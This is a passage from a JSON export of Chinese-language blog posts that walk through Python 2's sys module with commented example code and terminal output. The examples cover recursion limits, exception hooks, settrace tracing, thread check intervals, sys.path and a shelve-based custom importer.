limit: 1000 #默认可递归的次数为1000\nModified limit: 10\ngenerate_recursion_error(1)\ngenerate_recursion_error(2)\ngenerate_recursion_error(3)\ngenerate_recursion_error(4)\ngenerate_recursion_error(5)\ngenerate_recursion_error(6)\ngenerate_recursion_error(7)\ngenerate_recursion_error(8)\nCaught exception: maximum recursion depth exceeded while getting the str of an object #到达递归限制\n<pre class=\"sh_python\">\nimport sys</p>\n\n<p>print 'maxint    :', sys.maxint #python支持的最大数字\nprint 'maxsize   :', sys.maxsize #python支持的最大的数据大小\nprint 'maxunicode:', sys.maxunicode #支持 Unicode的最大整数\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "10"
    }
  },
  {
    "id": 233,
    "title": "关于sys研究（三）",
    "category": "python模块研究",
    "tags": [
      "sys"
    ],
    "url": "/archives/guanyusysyanjiusan/",
    "content": "<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>def my_excepthook(type, value, traceback): #三个参数包含：错误类型，错误值和错误的回调\n    print 'Unhandled error:', type, value</p>\n\n<p>sys.excepthook = my_excepthook #设置一个异常处理方法的通用处理</p>\n\n<p>print 'Before exception'</p>\n\n<p>raise RuntimeError('This is the error message')</p>\n\n<p>print 'After exception'\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nBefore exception\nUnhandled error: &lt;type 'exceptions.RuntimeError'&gt; This is the error message  #由这个异常做的处理，因为异常，不再执行后面的print</p>\n\n<p><pre class=\"sh_python\">\nimport sys\nimport threading\nimport time</p>\n\n<p>def do_something_with_exception():\nexc_type, exc_value = sys.exc_info()[:2] #当出现异常，通过sys.exc_info捕获当前异常，返回元组包含错误类型，错误值\n    print 'Handling %s exception with message \"%s\" in %s' % \\\n        (exc_type.__name__, exc_value, threading.current_thread().name)</p>\n\n<p>def cause_exception(delay):\n    time.sleep(delay)\n    raise RuntimeError('This is the error message')</p>\n\n<p>def thread_target(delay):\n    try:\n        cause_exception(delay)\n    except:\n        do_something_with_exception()</p>\n\n<p>threads = [ threading.Thread(target=thread_target, args=(0.3,)),\n            threading.Thread(target=thread_target, args=(0.1,)),\n            ]\nfor t in threads:\n    t.start()\nfor t in threads:\n    t.join()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nHandling RuntimeError exception with message \"This is the error message\" in Thread-2 #因为第2个线程time.sleep时间短，先完成\nHandling RuntimeError exception with message \"This is the error message\" in Thread-1</p>\n\n<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>def trace_calls(frame, event, arg): #调用跟踪函数需要三个参数：正在运行的代码 的堆栈帧，事件通知类型，事件参数\n    if event != 'call':\n        return\n    co = frame.f_code\n    func_name = co.co_name\n    if func_name == 'write':\n        return #放弃write\n    func_line_no = frame.f_lineno\n    func_filename = co.co_filename\n    caller = frame.f_back\n    caller_line_no = caller.f_lineno\n    caller_filename = caller.f_code.co_filename\n    print 'Call to %s on line %s of %s from line %s of %s' % \\\n        (func_name, func_line_no, func_filename,\n         caller_line_no, caller_filename)\n    return</p>\n\n<p>def b():\n    print 'in b()'</p>\n\n<p>def a():\n    print 'in a()'\n    b()</p>\n\n<p>sys.settrace(trace_calls) #settrace用来跟踪程序运行\na()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nCall to a on line 24 of test.py from line 29 of test.py #先运行到24行的def a()\nin a()\nCall to b on line 21 of test.py from line 26 of test.py #函数a调用了21行的b()\nin b()</p>\n\n<p>注：正在执行的事件类型：\n<table border=\"1\">\n<thead valign=\"bottom\">\n<tr>\n<th>事件</th>\n<th>时间点</th>\n<th>参数</th>\n</tr>\n</thead>\n<tbody valign=\"top\">\n<tr>\n<td><tt>'call'</tt></td>\n<td>方法执行前</td>\n<td><tt>None</tt></td>\n</tr>\n<tr>\n<td><tt>'line'</tt></td>\n<td>某行被执行前</td>\n<td><tt>None</tt></td>\n</tr>\n<tr>\n<td><tt>'return'</tt></td>\n<td>方法返回前</td>\n<td>返回值</td>\n</tr>\n<tr>\n<td><tt>'exception'</tt></td>\n<td>异常发生</td>\n<td>包含类型，值，回调的元组</td>\n</tr>\n<tr>\n<td><tt>'c_call'</tt></td>\n<td>c方法call前</td>\n<td>c方法对象</td>\n</tr>\n<tr>\n<td><tt>'c_return'</tt></td>\n<td>c方法返回后</td>\n<td><tt>None</tt></td>\n</tr>\n<tr>\n<td><tt>'c_exception'</tt></td>\n<td>c方法出现错误后</td>\n<td><tt>None</tt></td>\n</tr>\n</tbody>\n</table>\n<pre class=\"sh_python\">\nimport sys</p>\n\n<p>def trace_lines(frame, event, arg):\n    if event != 'line':\n        return\n    co = frame.f_code\n    func_name = co.co_name\n    line_no = frame.f_lineno\n    filename = co.co_filename\n    print '  %s line %s' % (func_name, line_no)</p>\n\n<p>def trace_calls(frame, event, arg):\n    if event != 'call':\n        return\n    co = frame.f_code\n    func_name = co.co_name\n    if func_name == 'write':\n        return\n    line_no = frame.f_lineno\n    filename = co.co_filename\n    print 'Call to %s on line %s of %s' % (func_name, line_no, filename)\n    if func_name in TRACE_INTO: #跟踪到新的方法里面，使用一个本地跟踪\n        return trace_lines\n    return</p>\n\n<p>def c(input):\n    print 'input =', input\n    print 'Leaving c()'</p>\n\n<p>def b(arg):\n    val = arg * 5\n    c(val)\n    print 'Leaving b()'</p>\n\n<p>def a():\n    b(2)\n    print 'Leaving a()'</p>\n\n<p>TRACE_INTO = ['b'] #保存在变量函数的全局列表</p>\n\n<p>sys.settrace(trace_calls)\na()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nCall to a on line 37 of test.py\nCall to b on line 32 of test.py\nb line 33\nb line 34\nCall to c on line 28 of test.py\ninput = 10\nLeaving c()\nb line 35\nLeaving b()\nLeaving a()\n<pre class=\"sh_python\">\nimport sys</p>\n\n<p>def trace_calls_and_returns(frame, event, arg):\n    co = frame.f_code\n    func_name = co.co_name\n    if func_name == 'write':\n        return\n    line_no = frame.f_lineno\n    filename = co.co_filename\n    if event == 'call':\n        print 'Call to %s on line %s of %s' % (func_name, line_no, filename)\n        return trace_calls_and_returns #返回值可以监测 到自身的引用    \n    elif event == 'return':\n        print '%s =&gt; %s' % (func_name, arg)\n    return</p>\n\n<p>def b():\n    print 'in b()'\n    return 'response_from_b '</p>\n\n<p>def a():\n    print 'in a()'\n    val = b()\n    return val * 2</p>\n\n<p>sys.settrace(trace_calls_and_returns)\na()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nCall to a on line 22 of test.py\nin a()\nCall to b on line 18 of test.py\nin b()\nb =&gt; response_from_b\na =&gt; response_from_b response_from_b</p>\n\n<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>def trace_exceptions(frame, event, arg): #通过寻找一个本地跟踪功能的<tt>异常</tt>事件监控异常，异常发生会返回错误类型，值和回调数据\n    if event != 'exception':\n        return\n    co = frame.f_code\n    func_name = co.co_name\n    line_no = frame.f_lineno\n    filename = co.co_filename\n    exc_type, exc_value, exc_traceback = arg\n    print 'Tracing exception: %s \"%s\" on line %s of %s' % \\\n        (exc_type.__name__, exc_value, line_no, func_name)</p>\n\n<p>def trace_calls(frame, event, arg):\n    if event != 'call':\n        return\n    co = frame.f_code\n    func_name = co.co_name\n    if func_name in TRACE_INTO:\n        return trace_exceptions</p>\n\n<p>def c():\n    raise RuntimeError('generating exception in c()')</p>\n\n<p>def b():\n    c()\n    print 'Leaving b()'</p>\n\n<p>def a():\n    b()\n    print 'Leaving a()'</p>\n\n<p>TRACE_INTO = ['a', 'b', 'c']</p>\n\n<p>sys.settrace(trace_calls)\ntry:\n    a()\nexcept Exception, e:\n    print 'Exception handler:', e\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nTracing exception: RuntimeError \"generating exception in c()\" on line 23 of c\nTracing exception: RuntimeError \"generating exception in c()\" on line 26 of b\nTracing exception: RuntimeError \"generating exception in c()\" on line 30 of a\nException handler: generating exception in c()\n<pre class=\"sh_python\">\nimport sys\nimport threading\nfrom Queue import Queue\nimport time</p>\n\n<p>def show_thread(q, extraByteCodes):\n    for i in range(5):\n        for j in range(extraByteCodes):\n            pass\n        q.put(threading.current_thread().name)\n    return</p>\n\n<p>def run_threads(prefix, interval, extraByteCodes):\n    print '%(prefix)s interval = %(interval)s with %(extraByteCodes)s extra operations' % locals()\n    sys.setcheckinterval(interval) #线程执行多任务。在一个固定的时间间隔，暂停字节码执行和解释检查是否需要执行任何信号处理。在相同的时间间隔检查，全局解释器锁释放当前线程，\n#然后获取，给其他线程一个机会执行，setcheckinterval修改这个间隔，但是可能影响性能\n    q = Queue()\n    threads = [ threading.Thread(target=show_thread, name='%s T%s' % (prefix, i), \n                                 args=(q, extraByteCodes)\n                                 )\n                for i in range(3)\n              ]\n    for t in threads:\n        t.start()\n    for t in threads:\n        t.join()\n    while not q.empty():\n        print q.get()\n    print\n    return</p>\n\n<p>run_threads('Default', interval=10, extraByteCodes=1000)\nrun_threads('Custom', interval=10, extraByteCodes=0)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nDefault interval = 10 with 1000 extra operations #当检查间隔是小于线程字节码的数量，解释可能给另一个线程控制，以便它运行一段时间\nDefault T0\nDefault T2\nDefault T1\nDefault T0\nDefault T2\nDefault T1\nDefault T0\nDefault T2\nDefault T1\nDefault T0\nDefault T0\nDefault T2\nDefault T1\nDefault T2\nDefault T1</p>\n\n<p>Custom interval = 10 with 0 extra operations #当检查间隔是大 于由一个线程正在执行的字节码数时不会释放控制，该线程将在时间间隔出现前完成其工作\nCustom T0\nCustom T0\nCustom T0\nCustom T0\nCustom T0\nCustom T1\nCustom T1\nCustom T2\nCustom T1\nCustom T2\nCustom T1\nCustom T1\nCustom T2\nCustom T2\nCustom T2\n<pre class=\"sh_python\">\nimport sys\nimport threading\nfrom Queue import Queue\nimport time</p>\n\n<p>def show_thread(q, extraByteCodes):\n    for i in range(5):\n        for j in range(extraByteCodes):\n            pass\n        #q.put(threading.current_thread().name)\n        print threading.current_thread().name ##使该线程打印直接追加到队列中，而不是<tt>sys.stdout</tt>修改。输出是可预测的要少得多\n     return</p>\n\n<p>def run_threads(prefix, interval, extraByteCodes):\n    print '%(prefix)s interval = %(interval)s with %(extraByteCodes)s extra operations' % locals()\n    sys.setcheckinterval(interval)\n    q = Queue()\n    threads = [ threading.Thread(target=show_thread, name='%s T%s' % (prefix, i), \n                                 args=(q, extraByteCodes)\n                                 )\n                for i in range(3)\n              ]\n    for t in threads:\n        t.start()\n    for t in threads:\n        t.join()\n    while not q.empty():\n        print q.get()\n    print\n    return</p>\n\n<p>run_threads('Default', interval=100, extraByteCodes=1000)\nrun_threads('Custom', interval=10, extraByteCodes=0)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport sys\nimport threading\nimport time</p>\n\n<p>io_lock = threading.Lock()\nblocker = threading.Lock()</p>\n\n<p>def block(i):\n    t = threading.current_thread()\n    with io_lock:\n        print '%s with ident %s going to sleep' % (t.name, t.ident)\n    if i:\n        blocker.acquire() # 获取但不释放\n        time.sleep(0.2)\n    with io_lock:\n        print t.name, 'finishing'\n    return</p>\n\n<p>threads = [ threading.Thread(target=block, args=(i,)) for i in range(3) ]\nfor t in threads:\n    t.setDaemon(True)\n    t.start()</p>\n\n<p>threads_by_ident = dict((t.ident, t) for t in threads) #映射对象和标识</p>\n\n<p>time.sleep(0.01)\nwith io_lock:\n    for ident, frame in sys._current_frames().items(): #识别死锁线程工作<tt>很难，sys._current_frames（）</tt>可以帮助准确显示\n        t = threads_by_ident.get(ident)\n        if not t: #主线程忽略\n            continue\n        print t.name, 'stopped in', frame.f_code.co_name, \n        print 'at line', frame.f_lineno, 'of', frame.f_code.co_filename\n</pre></p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nThread-1 with ident -1221342352 going to sleep\nThread-1 finishing #线程一没有sleep，完成了\nThread-2 with ident -1221342352 going to sleep #线程2获取block\nThread-3 with ident -1229735056 going to sleep\nThread-3 stopped in block at line 13 of test.py #线程3想获取block，但是被线程2占用\nThread-2 stopped in block at line 14 of test.py</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "10"
    }
  },
  {
    "id": 234,
    "title": "关于sys研究（四）",
    "category": "python模块研究",
    "tags": [

    ],
    "url": "/archives/guanyusysyanjiusi/",
    "content": "<p><pre class=\"sh_python\">\nimport sys\nimport textwrap</p>\n\n<p>names = sorted(sys.modules.keys()) #sys.modules是模块名和模块路径信息的字典集合\nname_text = ', '.join(names)</p>\n\n<p>print textwrap.fill(name_text)\nfor name in sys.builtin_module_names: #内建模块就是不用import进来就能使用的模块，这些模块不再上面的sys.modules里面\n    print name\nfor d in sys.path: # sys.path是管理模块的搜索路径的列表集合，包含当前目录，<tt>site-packages</tt>目录列在最后\n    print d    #注：当在执行程序时前面设置：PYTHONPATH=XXX:xxx，则首先输出它指定的目录\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport sys\nimport os</p>\n\n<p>base_dir = os.path.dirname(__file__) or '.' #dirname(__file__)表示当前程序文件所在目录\nprint 'Base directory:', base_dir</p>\n\n<p>package_dir_a = os.path.join(base_dir, 'package_dir_a')\nsys.path.insert(0, package_dir_a)  #在当前目录插入一个python目录路径</p>\n\n<p>import example\nprint 'Imported example from:', example.__file__\nprint '\\t', example.DATA  #比如这里是的数据是A</p>\n\n<p>package_dir_b = os.path.join(base_dir, 'package_dir_b')\nsys.path.insert(0, package_dir_b) #在当前目录再插入一个python目录路径\nreload(example) #reload这个模块，但是首先搜索的是package_dir_b下的这个模块数据\nprint 'Reloaded example from:', example.__file__\nprint '\\t', example.DATA #这里的数据就是B了\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>class NoisyImportFinder(object):</p>\n\n<p>    PATH_TRIGGER = 'NoisyImportFinder_PATH_TRIGGER' #设定一个数据，方便识别\n    def __init__(self, path_entry):\n        print 'Checking NoisyImportFinder support for %s' % path_entry\n        if path_entry != self.PATH_TRIGGER:\n            print 'NoisyImportFinder does not work for %s' % path_entry\n            raise ImportError()\n        return</p>\n\n<p>    def find_module(self, fullname, path=None):\n        print 'NoisyImportFinder looking for \"%s\"' % fullname\n        return None</p>\n\n<p>sys.path_hooks.append(NoisyImportFinder) #添加自定义的import的发现者</p>\n\n<p>sys.path.insert(0, NoisyImportFinder.PATH_TRIGGER) #将数据路径插入到python路径</p>\n\n<p>try:\n    import target_module\nexcept Exception, e:\n    print 'Import failed:', e\n</pre></p>\n\n<p>执行：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nChecking NoisyImportFinder support for NoisyImportFinder_PATH_TRIGGER #首先import使用我们自定义的import发现类\nNoisyImportFinder looking for \"target_module\"\nChecking NoisyImportFinder support for /home/dongwm #使用下一个python路径（当前目录）搜索\nNoisyImportFinder does not work for /home/dongwm #不工作\nImport failed: No module named target_module #使用系统的import发现</p>\n\n<p><pre class=\"sh_python\">\nimport sys #这事一个脚本,用来生成shelve对象\nimport shelve\nimport os</p>\n\n<p>filename = './import_example.shelve'\nif os.path.exists(filename):\n    os.unlink(filename)\ndb = shelve.open(filename)\ntry:\n    db['data:README'] = \"\"\"\n==============\npackage README\n==============</p>\n\n<p>This is the README for ``package``.\n\"\"\"\n    db['package.__init__'] = \"\"\"\nprint 'package imported'\nmessage = 'This message is in package.__init__'\n\"\"\"\n    db['package.module1'] = \"\"\"\nprint 'package.module1 imported'\nmessage = 'This message is in package.module1'\n\"\"\"\n    db['package.subpackage.__init__'] = \"\"\"\nprint 'package.subpackage imported'\nmessage = 'This message is in package.subpackage.__init__'\n\"\"\"\n    db['package.subpackage.module2'] = \"\"\"\nprint 'package.subpackage.module2 imported'\nmessage = 'This message is in package.subpackage.module2'\n\"\"\"\n    db['package.with_error'] = \"\"\"\nprint 'package.with_error being imported'\nraise ValueError('raising exception to break import')\n\"\"\"\n    print 'Created %s with:' % filename\n    for key in sorted(db.keys()):\n        print '\\t', key\nfinally:\n    db.close()\n</pre></p>\n\n<p>执行：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nCreated ./import_example.shelve with:\ndata:README\npackage.__init__\npackage.module1\npackage.subpackage.__init__\npackage.subpackage.module2\npackage.with_error\n<pre class=\"sh_python\">\nimport contextlib\nimport imp\nimport os\nimport shelve\nimport sys</p>\n\n<p>@contextlib.contextmanager\ndef shelve_context(filename, flag='r'): #创建上下文管理方法，让shelves使用with\n    db = shelve.open(filename, flag)\n    try:\n        yield db\n    finally:\n        db.close()</p>\n\n<p>def _mk_init_name(fullname): #返回被定义了包名字的__init__ module的名字\n    if fullname.endswith('.__init__'):\n        return fullname\n    return fullname + '.__init__'</p>\n\n<p>def _get_key_name(fullname, db): #在shelves里面寻找fullname或者fullname.__init__，返回名字\n    if fullname in db:\n        return fullname\n    init_name = _mk_init_name(fullname)\n    if init_name in db:\n        return init_name\n    return None</p>\n\n<p>class ShelveFinder(object): #shelve归档里面寻找模块\n    def __init__(self, path_entry):\n        if not os.path.isfile(path_entry):\n            raise ImportError\n        try:\n            with shelve_context(path_entry): \n                pass\n        except Exception, e:\n            raise ImportError(str(e))\n        else:\n            print 'new shelf added to import path:', path_entry\n            self.path_entry = path_entry\n        return</p>\n\n<p>    def __str__(self):\n        return '&lt;%s for \"%s\"&gt;' % (self.__class__.__name__, self.path_entry)</p>\n\n<p>    def find_module(self, fullname, path=None):\n        path = path or self.path_entry\n        print 'looking for \"%s\" in %s ...' % (fullname, path),\n        with shelve_context(path) as db:\n            key_name = _get_key_name(fullname, db)\n            if key_name:\n                print 'found it as %s' % key_name\n                return ShelveLoader(path)\n        print 'not found'\n        return None</p>\n\n<p>class ShelveLoader(object): #从shelve数据里面为模块加载源</p>\n\n<p>    def __init__(self, path_entry):\n        self.path_entry = path_entry\n        return</p>\n\n<p>    def _get_filename(self, fullname):\n        # Make up a fake filename that starts with the path entry\n        # so pkgutil.get_data() works correctly.\nreturn os.path.join(self.path_entry, fullname) #设置假文件，pkgutil.get_data()正常\n    def get_source(self, fullname):\n        print 'loading source for \"%s\" from shelf' % fullname\n        try:\n            with shelve_context(self.path_entry) as db:\n                key_name = _get_key_name(fullname, db)\n                if key_name:\n                    return db[key_name]\n                raise ImportError('could not find source for %s' % fullname)\n        except Exception, e:\n            print 'could not load source:', e\n            raise ImportError(str(e))</p>\n\n<p>    def get_code(self, fullname):\n        source = self.get_source(fullname)\n        print 'compiling code for \"%s\"' % fullname\n        return compile(source, self._get_filename(fullname), 'exec', dont_inherit=True)</p>\n\n<p>    def get_data(self, path):\n        print 'looking for data in %s for \"%s\"' % (self.path_entry, path)\n        if not path.startswith(self.path_entry):\n            raise IOError\n        path = path[len(self.path_entry)+1:]\n        key_name = 'data:' + path\n        try:\n            with shelve_context(self.path_entry) as db:\n                return db[key_name]\n        except Exception, e:\n            # Convert all errors to IOError\n            raise IOError</p>\n\n<p>    def is_package(self, fullname):\n        init_name = _mk_init_name(fullname)\n        with shelve_context(self.path_entry) as db:\n            return init_name in db</p>\n\n<p>    def load_module(self, fullname):\n        source = self.get_source(fullname)</p>\n\n<p>        if fullname in sys.modules:\n            print 'reusing existing module from previous import of \"%s\"' % fullname\n            mod = sys.modules[fullname]\n        else:\n            print 'creating a new module object for \"%s\"' % fullname\n            mod = sys.modules.setdefault(fullname, imp.new_module(fullname))\n        mod.__file__ = self._get_filename(fullname)\n        mod.__name__ = fullname\n        mod.__path__ = self.path_entry\n        mod.__loader__ = self\n        mod.__package__ = '.'.join(fullname.split('.')[:-1])</p>\n\n<p>        if self.is_package(fullname):\n            print 'adding path for package'\n            # Set __path__ for packages\n            # so we can find the sub-modules.\n            mod.__path__ = [ self.path_entry ]\n        else:\n            print 'imported as regular module'</p>\n\n<p>        print 'execing source...'\n        exec source in mod.__dict__\n        print 'done'\n        return mod\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport sys\nimport sys_shelve_importer</p>\n\n<p>def show_module_details(module):\n    print '  message    :', module.message\n    print '  __name__   :', module.__name__\n    print '  __package__:', module.__package__\n    print '  __file__   :', module.__file__\n    print '  __path__   :', module.__path__\n    print '  __loader__ :', module.__loader__</p>\n\n<p>filename = '/tmp/pymotw_import_example.shelve'\nsys.path_hooks.append(sys_shelve_importer.ShelveFinder)\nsys.path.insert(0, filename) #导入shelve文件</p>\n\n<p>print 'Import of \"package\":'\nimport package #import这个包</p>\n\n<p>print\nprint 'Examine package details:'\nshow_module_details(package)</p>\n\n<p>print\nprint 'Global settings:'\nprint 'sys.modules entry:', sys.modules['package']\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nImport of \"package\":\nnew shelf added to import path: import_example.shelve\nlooking for \"package\" in import_example.shelve ... found it as package.__init__\nloading source for \"package\" from shelf\ncreating a new module object for \"package\"\nadding path for package\nexecing source...\npackage imported\ndone</p>\n\n<p>Examine package details:\nmessage    : This message is in package.__init__\n__name__   : package\n__package__:\n__file__   : import_example.shelve/package\n__path__   : ['import_example.shelve']\n__loader__ : &lt;sys_shelve_importer.ShelveLoader object at 0x80aed0c&gt;</p>\n\n<p>Global settings:\nsys.modules entry: &lt;module 'package' from 'import_example.shelve/package'&gt;\n<pre class=\"sh_python\">\nimport sys\nimport sys_shelve_importer</p>\n\n<p>def show_module_details(module):\n    print '  message    :', module.message\n    print '  __name__   :', module.__name__\n    print '  __package__:', module.__package__\n    print '  __file__   :', module.__file__\n    print '  __path__   :', module.__path__\n    print '  __loader__ :', module.__loader__</p>\n\n<p>filename = 'import_example.shelve'\nsys.path_hooks.append(sys_shelve_importer.ShelveFinder)\nsys.path.insert(0, filename)</p>\n\n<p>print\nprint 'Import of \"package.module1\":'\nimport package.module1 #import子模块</p>\n\n<p>print\nprint 'Examine package.module1 details:'\nshow_module_details(package.module1)</p>\n\n<p>print\nprint 'Import of \"package.subpackage.module2\":'\nimport package.subpackage.module2</p>\n\n<p>print\nprint 'Examine package.subpackage.module2 details:'\nshow_module_details(package.subpackage.module2)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py</p>\n\n<p>Import of \"package.module1\":\nnew shelf added to import path: import_example.shelve\nlooking for \"package\" in import_example.shelve ... found it as package.__init__\nloading source for \"package\" from shelf\ncreating a new module object for \"package\"\nadding path for package\nexecing source...\npackage imported\ndone\nlooking for \"package.module1\" in import_example.shelve ... found it as package.module1\nloading source for \"package.module1\" from shelf\ncreating a new module object for \"package.module1\"\nimported as regular module\nexecing source...\npackage.module1 imported\ndone</p>\n\n<p>Examine package.module1 details:\nmessage    : This message is in package.module1\n__name__   : package.module1\n__package__: package\n__file__   : import_example.shelve/package.module1\n__path__   : import_example.shelve\n__loader__ : &lt;sys_shelve_importer.ShelveLoader object at 0x8119d6c&gt;</p>\n\n<p>Import of \"package.subpackage.module2\":\nlooking for \"package.subpackage\" in import_example.shelve ... found it as package.subpackage.__init__\nloading source for \"package.subpackage\" from shelf\ncreating a new module object for \"package.subpackage\"\nadding path for package\nexecing source...\npackage.subpackage imported\ndone\nlooking for \"package.subpackage.module2\" in import_example.shelve ... found it as package.subpackage.module2\nloading source for \"package.subpackage.module2\" from shelf\ncreating a new module object for \"package.subpackage.module2\"\nimported as regular module\nexecing source...\npackage.subpackage.module2 imported\ndone</p>\n\n<p>Examine package.subpackage.module2 details:\nmessage    : This message is in package.subpackage.module2\n__name__   : package.subpackage.module2\n__package__: package.subpackage\n__file__   : import_example.shelve/package.subpackage.module2\n__path__   : import_example.shelve\n__loader__ : &lt;sys_shelve_importer.ShelveLoader object at 0x8119e0c&gt;\n<pre class=\"sh_python\">\nimport sys\nimport sys_shelve_importer</p>\n\n<p>filename = 'import_example.shelve'\nsys.path_hooks.append(sys_shelve_importer.ShelveFinder)\nsys.path.insert(0, filename)</p>\n\n<p>print 'First import of \"package\":'\nimport package</p>\n\n<p>print\nprint 'Reloading \"package\":'\nreload(package) #创建一个新的模块对象，而不是现有的模块被重新使用\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nFirst import of \"package\":\nnew shelf added to import path: import_example.shelve\nlooking for \"package\" in import_example.shelve ... found it as package.__init__\nloading source for \"package\" from shelf\ncreating a new module object for \"package\"\nadding path for package\nexecing source...\npackage imported\ndone</p>\n\n<p>Reloading \"package\":\nlooking for \"package\" in import_example.shelve ... found it as package.__init__\nloading source for \"package\" from shelf\nreusing existing module from previous import of \"package\"\nadding path for package\nexecing source...\npackage imported\ndone\n<pre class=\"sh_python\">\nimport sys\nimport sys_shelve_importer</p>\n\n<p>filename = 'import_example.shelve'\nsys.path_hooks.append(sys_shelve_importer.ShelveFinder)\nsys.path.insert(0, filename)</p>\n\n<p>try:\n    import package.module3\nexcept ImportError, e:\n    print 'Failed to import:', e\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nnew shelf added to import path: import_example.shelve\nlooking for \"package\" in import_example.shelve ... found it as package.__init__\nloading source for \"package\" from shelf\ncreating a new module object for \"package\"\nadding path for package\nexecing source...\npackage imported\ndone\nlooking for \"package.module3\" in import_example.shelve ... not found\nFailed to import: No module named module3\n<pre class=\"sh_python\">\nimport sys\nimport sys_shelve_importer\nimport os\nimport pkgutil</p>\n\n<p>filename = '/tmp/pymotw_import_example.shelve'\nsys.path_hooks.append(sys_shelve_importer.ShelveFinder)\nsys.path.insert(0, filename)</p>\n\n<p>import package</p>\n\n<p>readme_path = os.path.join(package.__path__[0], 'README')</p>\n\n<p>#readme = package.__loader__.get_data(readme_path)\nreadme = pkgutil.get_data('package', 'README') #返回文件内容\nprint readme</p>\n\n<p>foo_path = os.path.join(package.__path__[0], 'foo')\n#foo = package.__loader__.get_data(foo_path)\nfoo = pkgutil.get_data('package', 'foo')\nprint foo\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-vkmz:~&gt; python test.py\nnew shelf added to import path: import_example.shelve\nlooking for \"package\" in import_example.shelve ... found it as package.__init__\nloading source for \"package\" from shelf\ncreating a new module object for \"package\"\nadding path for package\nexecing source...\npackage imported\ndone\nlooking for data in import_example.shelve for \"import_example.shelve/README\"</p>\n\n<p>==============\npackage README\n==============</p>\n\n<p>This is the README for ``package``.</p>\n\n<p>looking for data in import_example.shelve for \"import_example.shelve/foo\"\nTraceback (most recent call last):\nFile \"test.py\", line 20, in &lt;module&gt;\nfoo = pkgutil.get_data('package', 'foo')\nFile \"/usr/lib/python2.6/pkgutil.py\", line 583, in get_data\nreturn loader.get_data(resource_name)\nFile \"/home/dongwm/sys_shelve_importer.py\", line 107, in get_data\nraise IOError\nIOError</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "10"
    }
  },
  {
    "id": 235,
    "title": "关于sys研究（一）",
    "category": "python模块研究",
    "tags": [
      "sys"
    ],
    "url": "/archives/guanyusysyanjiuyi/",
    "content": "<p>前言：sys是一个关系系统配置使用的模块，和os一样经常被使用</p>\n\n<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>print 'Version info:'\nprint\nprint 'sys.version      =', repr(sys.version) #这些是编译python时候的一些系统信息，这事python版本\nprint 'sys.version_info =', sys.version_info #python版本号元组格式\nprint 'sys.hexversion   =', hex(sys.hexversion) #版本标识为一个整数\nprint 'sys.subversion   =', sys.subversion #python分支，修订号等信息\nprint 'sys.api_version  =', sys.api_version #C的api版本\nprint 'This interpreter was built for:', sys.platform #系统版本，比如linux，windows等类似于命令uname -s的结果\nprint 'Interpreter executable:', sys.executable #编译器的位置 /usr/bin/python\nprint 'Installation prefix   :', sys.prefix #包含bin,lib目录的服目录，这里是/usr\nprint <tt>sys.flags</tt> #当执行python -h 出现很多选项，当执行某选项和参数，那么sys.flag就包含了这个项\nprint 'Default encoding    :', sys.getdefaultencoding()  #默认文件Unicode编码\nprint 'Filesystem encoding :', sys.getfilesystemencoding() #默认文件系统编码\n#reload(sys) #当想要修改文件编码，先reloadsys模块（否则没有setdefaultencoding函数），再set\n#sys.setdefaultencoding('utf-8')\n</pre></p>\n\n<p><pre class=\"sh_python\">\n&gt;&gt;&gt; sys.ps1\n'&gt;&gt;&gt; ' #ps1是交互模式中的提示符，效果类似于linux的PS1\n&gt;&gt;&gt; sys.ps2\n'... ' #ps2是交互模式中，当出现\":\"等需要多行输入的数据时候的提示符\n&gt;&gt;&gt; sys.ps1='--&gt;'\n--&gt;sys.ps2='~~~'\n--&gt;for i in xrange(2): \n~~~    print i\n~~~\n0\n1\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>class LineCounter(object): #修改PS1修饰符还可以定义类的方式，假设本文件是test.py\n    def __init__(self):\n        self.count = 0 #对命令计数，初始为0\n    def __str__(self):\n        self.count += 1 #使用一次触发一次计数增加      \n        return '(%3d)&gt; ' % self.count\n</pre></p>\n\n<p>进入交互模式：</p>\n\n<p><pre class=\"sh_python\">\n&gt;&gt;&gt; from test import LineCounter\n&gt;&gt;&gt; import sys\n&gt;&gt;&gt; sys.ps1 = LineCounter()\n(  1)&gt; \n(  2)&gt; #点击一次增加1\n(  3)&gt;\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>class ExpressionCounter(object):</p>\n\n<p>    def __init__(self):\n        self.count = 0\n        self.previous_value = self</p>\n\n<p>    def __call__(self, value):\n        print\n        print '  Previous:', self.previous_value\n        print '  New     